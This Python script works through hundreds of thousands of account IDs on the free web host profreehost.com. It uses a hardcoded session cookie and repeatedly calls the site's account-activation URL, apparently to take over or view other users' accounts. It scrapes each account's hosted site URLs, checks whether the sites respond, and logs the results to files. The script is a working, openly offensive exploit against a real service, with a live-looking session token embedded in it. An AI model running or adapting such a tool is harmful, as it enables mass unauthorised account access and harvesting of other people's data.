import requests as req, os, re, ltp
import itertools

def chunker(n, iterable):
    it = iter(iterable)
    while True:
        chunk = tuple(itertools.islice(it, n))
        if not chunk:
            return
        yield chunk

def find(INPUT, START, END):
    INDEX_START = INPUT.index(START)
    INDEX_END = INPUT.index(END, INDEX_START+1)
    return INPUT[INDEX_START+len(START):INDEX_END]

headers={
'Host': 'profreehost.com',
'cookie': 'PHPSESSID=5lt5dbrtlckrcpqa7ju4k7soq0; cookieconsent_status=dismiss; pfh_rm=86f019e7b612c7d90d911f14f5f6d8bc-1892662'
}
os.system("clear")

def check(id):
    # try:
    YES=0
    o=[]
    n=[]
    hG=req.get("https://profreehost.com/account/activate/?view=active&valid=true&id="+str(id)+"&code=7", headers=headers)
    if "Your account is already activated" not in hG.text:
        ltp.printf("SHIT -> "+str(id))
        return
    r=re.findall('listUrl.*.["] ', req.get("https://profreehost.com/account/", headers=headers).text)
    for i in range(0,3):
        try:
            if "ezyro.com" in str(r[i]) or "unaux.com" in str(r[i]) or "liveblog365.com" in str(r[i]):
                o.append(find(r[i], '="', '" '))
                YES=0
            else:
                o.append(find(r[i], '="', '" '))
                YES=1
        except:
            pass
    if str(o)=="[]":
        ltp.printf("INVALID -> "+str(id))
        return
    else:
        if YES==1:
            for xXx in o:
                x=req.get(xXx, allow_redirects=False)
                if x.status_code==301:
                    ltp.app("https.txt", str(xXx)+"|"+str(id))
                elif x.status_code==200:
                    ltp.app("http.txt", str(xXx)+"|"+str(id))
                else:
                    ltp.app("tryagain.txt", str(xXx)+"|"+str(id))
            ltp.printf("LIVE -> "+str(o)+"\n")
            ltp.app("yes_website.txt", str(id)+" | "+str(o))
        else:
            ltp.printf("DEAD -> "+str(id))
            ltp.app("no_website.txt", str(id)+" | "+str(o))
    # except Exception as xc:
        # print(xc)

# xzk=int(ltp.get('ids.txt')[-1])
chunks = list(range(2320184, 3000000))
for chunk in chunker(200, chunks):
    with ltp.exe(50) as exe:#200
        exe.map(check, chunk)
        del exe, chunk
del chunks, file




